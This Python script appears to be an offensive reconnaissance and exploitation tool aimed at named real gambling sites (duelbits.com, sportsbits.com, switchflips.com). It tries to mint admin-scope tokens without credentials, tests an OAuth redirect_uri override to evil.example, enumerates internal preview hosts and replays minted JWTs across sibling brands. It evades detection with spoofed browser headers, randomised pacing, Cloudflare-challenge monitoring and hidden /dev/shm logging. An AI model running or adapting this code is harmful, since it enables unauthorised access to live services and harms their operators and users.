#!/usr/bin/env python3
"""
duelbits round-2: NEW vector classes only (ledger negatives are the exclusion list).
Runs on Vermes. Artifacts in /dev/shm/.dkv only.
Phases:
  sports        sportsbits.com brand surface (root/bundle/mint/feed/region-gate)
  switchflips   switchflips.com OAuth provider surface + redirect_uri override + state binding
  preview       dev.r19.ea + deploy-preview-N.r19.ea internal Netlify host enumeration
  crossbrand    minted JWT (duelbits.com) accepted on sibling brands' gated endpoints?
Log: /dev/shm/.dkv/round2.jsonl
"""
import json, os, random, re, subprocess, sys, time
import requests

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")
WORK = "/dev/shm/.dkv"
LOG = os.path.join(WORK, "round2.jsonl")
STATE = {"sleep": 3.5, "blocks": 0, "reqs": 0}

def log(d):
    d["t"] = time.strftime("%H:%M:%S")
    with open(LOG, "a") as f:
        f.write(json.dumps(d) + "\n")

def pace():
    STATE["sleep"] = random.uniform(2.5, 5.0)
    time.sleep(STATE["sleep"])

def heat():
    STATE["blocks"] += 1
    if STATE["blocks"] >= 4:
        log({"phase": STATE.get("phase"), "verdict": "VANTAGE_BURNED"})
        sys.exit(2)

def cool():
    STATE["blocks"] = 0

def hdrs(base, extra=None):
    h = {
        "User-Agent": UA,
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9", "DNT": "1",
        "sec-ch-ua": '"Chromium";v="131", "Not_A Brand";v="24"',
        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
        "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin", "Origin": base, "Referer": base + "/",
        "Accept-Encoding": "gzip, deflate, br",
    }
    if extra:
        h.update(extra)
    return h

def get(url, base=None, extra=None, allow_redirects=False, timeout=12):
    base = base or url.split("/")[0]
    r = requests.get(url, headers=hdrs(base, extra), timeout=timeout,
                     allow_redirects=allow_redirects, verify=True)
    STATE["reqs"] += 1
    return r

def post(url, base=None, data=None, timeout=12):
    base = base or url.split("/")[0]
    r = requests.post(url, headers=hdrs(base, {"Content-Type": "application/json"}),
                      json=data, timeout=timeout)
    STATE["reqs"] += 1
    return r

def classify(r, name, phase):
    ct = r.headers.get("content-type", "")
    size = len(r.content)
    body = r.text[:160].replace("\n", " ")
    verdict = "OPEN" if r.status_code == 200 and "json" in ct else \
              ("GHOST" if r.status_code == 200 else ("BLOCK" if r.status_code in (403, 503) else str(r.status_code)))
    rec = {"phase": phase, "name": name, "status": r.status_code, "ct": ct[:40],
           "size": size, "verdict": verdict, "body": body}
    log(rec)
    low = body.lower()
    waf = ("just a moment" in low) or ("cf-chl" in low) or ("turnstile" in low) or \
          (r.status_code == 503) or (r.status_code == 429)
    if waf:
        heat()
    else:
        cool()
    return rec

# ---------------------------------------------------------------- sports
def phase_sports():
    STATE["phase"] = "sports"
    B = "https://sportsbits.com"
    for name, url in [
        ("root", B + "/"),
        ("ws_config_currencies", B + "/ws/config/currencies"),
        ("ws_user_bets_live", B + "/ws/user/bets/live"),
        ("auth_web3_message", B + "/auth/web3/message/?publicAddress=0x0000000000000000000000000000000000000001"),
        ("auth_blockcheck", B + "/auth/blockCheck"),
    ]:
        pace()
        try:
            r = get(url, base=B, allow_redirects=True)
            classify(r, name, "sports")
        except Exception as e:
            log({"phase": "sports", "name": name, "verdict": "ERR", "body": str(e)[:120]})
            heat()
    # scope mint on the sportsbook brand
    pace()
    try:
        r = post(B + "/auth/token?scope=admin", base=B, data={})
        rec = classify(r, "auth_token_scope_admin_mint", "sports")
        if rec["verdict"] == "OPEN" or (r.status_code == 201):
            try:
                tok = r.json().get("access_token") or r.json().get("token") or ""
                if tok:
                    open(os.path.join(WORK, "sports_token.txt"), "w").write(tok)
                    log({"phase": "sports", "name": "mint_token", "verdict": "MINTED",
                         "body": "token len %d head %s" % (len(tok), tok[:24])})
            except Exception:
                pass
    except Exception as e:
        log({"phase": "sports", "name": "mint", "verdict": "ERR", "body": str(e)[:120]})

# ---------------------------------------------------------------- switchflips
def phase_switchflips():
    STATE["phase"] = "switchflips"
    B = "https://switchflips.com"
    for name, url in [
        ("root", B + "/"),
        ("auth_web3_message", B + "/auth/web3/message/?publicAddress=0x0000000000000000000000000000000000000001"),
        ("auth_blockcheck", B + "/auth/blockCheck"),
        ("ws_config_currencies", B + "/ws/config/currencies"),
        ("ws_user_bets_live", B + "/ws/user/bets/live"),
    ]:
        pace()
        try:
            r = get(url, base=B, allow_redirects=True)
            classify(r, name, "switchflips")
        except Exception as e:
            log({"phase": "switchflips", "name": name, "verdict": "ERR", "body": str(e)[:120]})
            heat()
    # oauth authorize surface + redirect_uri override (gratisfy pattern)
    for name, url in [
        ("oauth_authorize_bare", B + "/auth/oauth/authorize"),
        ("oauth_authorize_discord", B + "/auth/oauth/authorize?provider=discord"),
        ("oauth_authorize_redirect", B + "/auth/oauth/authorize?provider=discord&redirect_uri=https://evil.example/cb"),
        ("oauth_discord_start", B + "/auth/discord"),
    ]:
        pace()
        try:
            r = get(url, base=B, allow_redirects=False)
            loc = r.headers.get("location", "")
            classify(r, name, "switchflips")
            if loc:
                log({"phase": "switchflips", "name": name + "_location", "verdict": "REDIRECT",
                     "body": loc[:200]})
        except Exception as e:
            log({"phase": "switchflips", "name": name, "verdict": "ERR", "body": str(e)[:120]})
            heat()
    # scope mint on oauth brand
    pace()
    try:
        r = post(B + "/auth/token?scope=admin", base=B, data={})
        rec = classify(r, "auth_token_scope_admin_mint", "switchflips")
        if rec["verdict"] == "OPEN" or r.status_code == 201:
            try:
                tok = r.json().get("access_token") or r.json().get("token") or ""
                if tok:
                    open(os.path.join(WORK, "switchflips_token.txt"), "w").write(tok)
                    log({"phase": "switchflips", "name": "mint_token", "verdict": "MINTED",
                         "body": "token len %d head %s" % (len(tok), tok[:24])})
            except Exception:
                pass
    except Exception as e:
        log({"phase": "switchflips", "name": "mint", "verdict": "ERR", "body": str(e)[:120]})

# ---------------------------------------------------------------- preview
def phase_preview():
    STATE["phase"] = "preview"
    hosts = ["dev.r19.ea.duelbits.com", "dev.r19.ea.duelbits.io",
             "preview.r19.ea.duelbits.com"]
    hosts += ["deploy-preview-%d.r19.ea.duelbits.com" % i for i in range(1, 26)]
    hosts += ["deploy-preview-%d.r19.ea.duelbits.io" % i for i in (1, 2, 3)]
    resolved = []
    for h in hosts:
        try:
            out = subprocess.run(["getent", "hosts", h], capture_output=True, text=True, timeout=5)
            if out.returncode == 0 and out.stdout.strip():
                ip = out.stdout.split()[0]
                resolved.append((h, ip))
                log({"phase": "preview", "name": "resolve_" + h, "verdict": "RESOLVED", "body": ip})
        except Exception:
            pass
    if resolved:
        for h, ip in resolved:
            pace()
            try:
                r = get("https://" + h + "/", base="https://" + h, allow_redirects=True)
                classify(r, "fetch_" + h, "preview")
            except Exception as e:
                log({"phase": "preview", "name": "fetch_" + h, "verdict": "ERR", "body": str(e)[:120]})
    else:
        log({"phase": "preview", "verdict": "NONE_RESOLVED"})

# ---------------------------------------------------------------- crossbrand
def phase_crossbrand():
    STATE["phase"] = "crossbrand"
    # mint fresh on duelbits.com
    tok = ""
    for scope in ("admin", "user"):
        pace()
        try:
            r = post("https://duelbits.com/auth/token?scope=" + scope, base="https://duelbits.com", data={})
            j = r.json()
            tok = j.get("access_token") or j.get("token") or ""
            if tok:
                log({"phase": "crossbrand", "name": "mint_duelbits_" + scope, "verdict": "MINTED",
                     "body": "len %d head %s" % (len(tok), tok[:24])})
                break
            classify(r, "mint_duelbits_" + scope, "crossbrand")
        except Exception as e:
            log({"phase": "crossbrand", "name": "mint_duelbits_" + scope, "verdict": "ERR", "body": str(e)[:120]})
    if not tok:
        log({"phase": "crossbrand", "verdict": "NO_TOKEN_TO_TEST"})
        return
    # gate discriminator first: known-gated endpoint on duelbits.com (should 403)
    for host, base in [("sportsbits.com", "https://sportsbits.com"),
                       ("switchflips.com", "https://switchflips.com")]:
        for path in ("/ws/user/profile", "/ws/user/bets/live", "/ws/user/transactions"):
            pace()
            for variant, extra in [("bearer", {"Authorization": "Bearer " + tok}),
                                    ("query", {})]:
                url = base + path
                if variant == "query":
                    url += ("&" if "?" in path else "?") + "token=" + tok
                try:
                    r = get(url, base=base, extra=extra, allow_redirects=False)
                    rec = classify(r, "cross_%s%s_%s" % (host.split(".")[0], path.split("/")[-1], variant), "crossbrand")
                except Exception as e:
                    log({"phase": "crossbrand", "name": "err_%s_%s" % (host, path),
                         "verdict": "ERR", "body": str(e)[:120]})

if __name__ == "__main__":
    log({"phase": "round2", "verdict": "START", "egress": "92.5.99.31"})
    phases = {"sports": phase_sports, "switchflips": phase_switchflips,
              "preview": phase_preview, "crossbrand": phase_crossbrand}
    wanted = sys.argv[1:] or list(phases)
    for p in wanted:
        phases[p]()
    log({"phase": "round2", "verdict": "DONE", "reqs": STATE["reqs"]})